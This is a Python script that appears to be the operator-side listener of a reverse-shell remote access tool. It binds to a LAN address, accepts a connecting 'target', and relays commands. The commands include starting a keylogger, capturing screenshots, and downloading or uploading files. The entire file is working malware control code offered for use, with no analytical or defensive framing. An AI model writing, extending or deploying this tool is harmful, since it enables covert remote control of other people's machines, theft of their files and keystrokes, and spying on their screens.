#!/usr/bin/env python3
import socket
import json
import base64

count = 1

def reliable_send(data):
    """Send data to client in JSON format with newline delimiter"""
    msg = json.dumps(data) + "\n"
    target.sendall(msg.encode("utf-8"))

def reliable_recv():
    """Receive data from client, framed by newline delimiter"""
    buf = b""
    while b"\n" not in buf:
        chunk = target.recv(4096)
        if not chunk:
            raise Exception("Connection closed")
        buf += chunk
    line, _, _ = buf.partition(b"\n")
    return json.loads(line.decode("utf-8"))

def shell():
    """Main shell loop - send commands and receive results"""
    global count
    while True:
        try:
            command = input("* Shell#~%s: " % str(ip))
            reliable_send(command)

            if command == "q":
                break
            elif command.startswith("cd "):
                print(reliable_recv())
            elif command.startswith("keylog_start"):
                print(reliable_recv())
            elif command.startswith("download "):
                file_path = command[9:].strip()
                result = reliable_recv()
                if isinstance(result, str) and not result.startswith("[!!]"):
                    try:
                        with open(file_path, "wb") as file:
                            file.write(base64.b64decode(result.encode("ascii")))
                        print(f"[+] File downloaded successfully: {file_path}")
                    except Exception as e:
                        print(f"[!!] Failed to save file: {str(e)}")
                else:
                    print(result)
            elif command.startswith("upload "):
                try:
                    file_path = command[7:].strip()
                    with open(file_path, "rb") as fin:
                        file_data = base64.b64encode(fin.read()).decode("ascii")
                        reliable_send(file_data)
                    print(reliable_recv())
                except Exception as e:
                    print(f"[!!] Failed to upload file: {str(e)}")
            elif command.startswith("screenshot"):
                result = reliable_recv()
                if isinstance(result, str) and not result.startswith("[!!]"):
                    try:
                        screenshot_filename = f"screenshot{count}.png"
                        with open(screenshot_filename, "wb") as screen:
                            screen.write(base64.b64decode(result.encode("ascii")))
                        print(f"[+] Screenshot saved as {screenshot_filename}")
                        count += 1
                    except Exception as e:
                        print(f"[!!] Failed to save screenshot: {str(e)}")
                else:
                    print(result)
            else:
                print(reliable_recv())
        except KeyboardInterrupt:
            print("\n[!] Exiting...")
            break
        except Exception as e:
            print(f"[!!] Error: {str(e)}")
            break

def server():
    """Set up server and wait for client connection"""
    global s, ip, target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("192.168.218.129", 54321))
    s.listen(5)
    print("[+] Listening for Incoming Connections on 192.168.218.129:54321")
    target, ip = s.accept()
    print(f"[+] Target Connected from {ip[0]}:{ip[1]}!")

if __name__ == "__main__":
    server()
    shell()
    s.close()
